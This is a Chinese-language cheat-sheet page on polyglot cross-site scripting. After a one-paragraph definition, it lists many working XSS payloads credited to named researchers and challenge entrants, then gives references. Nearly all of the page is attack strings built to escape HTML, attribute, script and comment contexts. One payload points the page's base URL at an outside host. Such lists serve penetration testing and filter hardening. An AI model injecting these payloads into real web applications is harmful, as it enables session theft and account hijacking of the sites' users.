# 多语言XSS

多语言XSS是一种跨站脚本（XSS）有效负载，旨在在Web应用程序的多个上下文中工作，例如HTML、JavaScript和属性。它利用了应用程序在不同解析场景中无法正确清理输入的漏洞。

* 多语言XSS - 0xsobky

    ```javascript
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
    ```

* 多语言XSS - Ashar Javed

    ```javascript
    ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
    ```

* 多语言XSS - Mathias Karlsson

    ```javascript
    " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    ```

* 多语言XSS - Rsnake

    ```javascript
    ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
    ```

* 多语言XSS - Daniel Miessler

    ```javascript
    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
    javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
    javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
    javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
    javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
    javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
    --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
    /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
    javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
    /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
    ```

* 多语言XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
    ![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)

    ```javascript
    -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
    ```

    ![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)

    ```javascript
    <svg%0Ao%00nload=%09((pro\u006dmpt))()//
    ```

* 多语言XSS - 来自[@filedescriptor的Polyglot挑战](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)

    ```javascript
    // 作者: crlf
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

    // 作者: europa
    javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

    // 作者: EdOverflow
    javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

    // 作者: h1/ragnar
    javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
    ```

* 多语言XSS - 来自[brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)

    ```javascript
    JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
    ```

## 参考资料

* [构建XSS多语言 - Brute - 2021年6月23日](https://brutelogic.com.br/blog/building-xss-polyglots/)
* [XSS多语言挑战v2 - @filedescriptor - 2015年8月20日](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)